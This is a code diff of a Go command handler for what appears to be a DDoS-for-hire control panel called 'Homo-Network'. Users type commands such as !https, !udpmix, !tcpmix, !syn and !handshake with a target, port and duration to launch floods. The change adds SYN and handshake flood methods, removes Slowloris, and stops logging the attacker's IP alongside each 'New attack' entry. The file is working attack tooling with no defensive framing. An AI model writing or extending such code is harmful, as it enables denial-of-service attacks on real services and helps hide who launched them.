@@ -42,7 +42,7 @@ func CommandManager(conn net.Conn) {
 	}
 
 	if st {
-		Print(gradient.Rainbow().Apply("["+s.Login+"@homo-network]")+color.HiWhiteString("$ "), conn)
+		Print(gradient.Rainbow().Apply("\r["+s.Login+"@homo-network]")+color.HiWhiteString("$ "), conn)
 	}
 	line := make([]byte, 2048)
 
@@ -65,53 +65,51 @@ func CommandManager(conn net.Conn) {
 		fmt.Println(cmd)
 
 		if len(cmd) < 3 {
-			CommandError("!https <TARGET> <PORT> <DURATION>\n", "!https https://example.com 443 60\n", conn)
+			CommandError("!https <TARGET> <PORT> <DURATION>\n\r", "!https https://example.com 443 60\n\r", conn)
 		}
 		if len(cmd) > 4 {
-			CommandError("!https <TARGET> <PORT> <DURATION>\n", "!https https://example.com 443 60\n", conn)
+			CommandError("!https <TARGET> <PORT> <DURATION>\n\r", "!https https://example.com 443 60\n\r", conn)
 		}
 
 		if !strings.HasPrefix(cmd[1], "https://") {
-			CommandError("!https <TARGET> <PORT> <DURATION>\n", "!https https://example.com 443 60\n", conn)
+			CommandError("!https <TARGET> <PORT> <DURATION>\n\r", "!https https://example.com 443 60\n\r", conn)
 		}
 
 		go server.Https(cmd[1], cmd[3], cmd[2])
-		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "||IP: " + s.Ip + "*")
-		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
-	} else if strings.HasPrefix(string(line), "!slowloris") {
-		cmd := strings.Split(string(line), " ")
-		fmt.Println(cmd)
 
-		if len(cmd) < 3 {
-			CommandError("!slowloris <TARGET> <PORT> <DURATION>\n", "!slowloris https://example.com 443 60\n", conn)
-		}
-		if len(cmd) > 4 {
-			CommandError("!slowloris <TARGET> <PORT> <DURATION>\n", "!slowloris https://example.com 443 60\n", conn)
-		}
-
-		if !strings.HasPrefix(cmd[1], "https://") {
-			CommandError("!slowloris <TARGET> <PORT> <DURATION>\n", "!slowloris https://example.com 443 60\n", conn)
-		}
-
-		go server.Slowloris(cmd[1], cmd[3], cmd[2])
-		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "||IP: " + s.Ip + "*")
-		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
-		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 	} else if strings.HasPrefix(string(line), "!udpmix") {
 		cmd := strings.Split(string(line), " ")
 		fmt.Println(cmd)
 
 		if len(cmd) < 3 {
-			CommandError("!udpmix <TARGET> <PORT> <DURATION>\n", "!udpmix 1.1.1.1 1093 60\n", conn)
+			CommandError("!udpmix <TARGET> <PORT> <DURATION>\n\r", "!udpmix 1.1.1.1 1093 60\r\n", conn)
 		}
 		if len(cmd) > 4 {
-			CommandError("!udpmix <TARGET> <PORT> <DURATION>\n", "!udpmix 1.1.1.1 1093 60\n", conn)
+			CommandError("!udpmix <TARGET> <PORT> <DURATION>\n\r", "!udpmix 1.1.1.1 1093 60\r\n", conn)
 		}
 
 		go server.Udpmix(cmd[1], cmd[3], cmd[2])
-		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "||IP: " + s.Ip + "*")
-		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
+		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+
+	} else if strings.HasPrefix(string(line), "!handshake") {
+		cmd := strings.Split(string(line), " ")
+		fmt.Println(cmd)
+
+		if len(cmd) < 3 {
+			CommandError("!handshake <TARGET> <PORT> <DURATION>\n\r", "!handshake 1.1.1.1 1093 60\n\r", conn)
+		}
+		if len(cmd) > 4 {
+			CommandError("!handshake <TARGET> <PORT> <DURATION>\n\r", "!handshake 1.1.1.1 1093 60\n\r", conn)
+		}
+
+		go server.Handshake(cmd[1], cmd[3], cmd[2])
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 
 	} else if strings.HasPrefix(string(line), "!tcpmix") {
@@ -119,15 +117,31 @@ func CommandManager(conn net.Conn) {
 		fmt.Println(cmd)
 
 		if len(cmd) < 3 {
-			CommandError("!tcpmix <TARGET> <PORT> <DURATION>\n", "!tcpmix 1.1.1.1 1093 60\n", conn)
+			CommandError("!tcpmix <TARGET> <PORT> <DURATION>\n\r", "!tcpmix 1.1.1.1 1093 60\n\r", conn)
 		}
 		if len(cmd) > 4 {
-			CommandError("!tcpmix <TARGET> <PORT> <DURATION>\n", "!tcpmix 1.1.1.1 1093 60\n", conn)
+			CommandError("!tcpmix <TARGET> <PORT> <DURATION>\n\r", "!tcpmix 1.1.1.1 1093 60\n\r", conn)
 		}
 
 		go server.Tcpmix(cmd[1], cmd[3], cmd[2])
-		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "||IP: " + s.Ip + "*")
-		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
+		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+
+	} else if strings.HasPrefix(string(line), "!syn") {
+		cmd := strings.Split(string(line), " ")
+		fmt.Println(cmd)
+
+		if len(cmd) < 3 {
+			CommandError("!syn <TARGET> <PORT> <DURATION>\n\r", "!syn 1.1.1.1 1093 60\n\r", conn)
+		}
+		if len(cmd) > 4 {
+			CommandError("!syn <TARGET> <PORT> <DURATION>\n\r", "!syn 1.1.1.1 1093 60\n\r", conn)
+		}
+
+		go server.Syn(cmd[1], cmd[3], cmd[2])
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 
 	} else if strings.HasPrefix(string(line), "!scanner") {
@@ -141,10 +155,11 @@ func CommandManager(conn net.Conn) {
 
 		conn.Write([]byte("\n"))
 
-		conn.Write([]byte(color.HiWhiteString("!https: Basic https flood\t\t| Type: L7\n")))
-		conn.Write([]byte(color.HiWhiteString("!slowloris: Slowloris method\t\t| Type: L7\n")))
-		conn.Write([]byte(color.HiWhiteString("!udpmix: Udp mix method\t\t\t| Type: L4\n")))
-		conn.Write([]byte(color.HiWhiteString("!tcpmix: Tcp mix method\t\t\t| Type: L4\n")))
+		conn.Write([]byte(color.HiWhiteString("!https: Basic https flood\t\t| Type: L7\n\r")))
+		conn.Write([]byte(color.HiWhiteString("!udpmix: Udp mix method\t\t\t| Type: L4\n\r")))
+		conn.Write([]byte(color.HiWhiteString("!tcpmix: Tcp mix method\t\t\t| Type: L4\n\r")))
+		conn.Write([]byte(color.HiWhiteString("!syn: Syn flood method\t\t\t| Type: L4\n\r")))
+		conn.Write([]byte(color.HiWhiteString("!handshake: Handshake method\t\t| Type: L4\n\r")))
 
 		conn.Write([]byte("\n"))
 
@@ -167,7 +182,7 @@ func CommandManager(conn net.Conn) {
 		args := strings.Split(line, " ")
 
 		if len(args) < 2 {
-			Print(gradient.Rainbow().Apply("!adduser <LOGIN> <PASSWORD>\n"), conn)
+			Print(gradient.Rainbow().Apply("!adduser <LOGIN> <PASSWORD>\n\r"), conn)
 			CommandManager(conn)
 		}
 
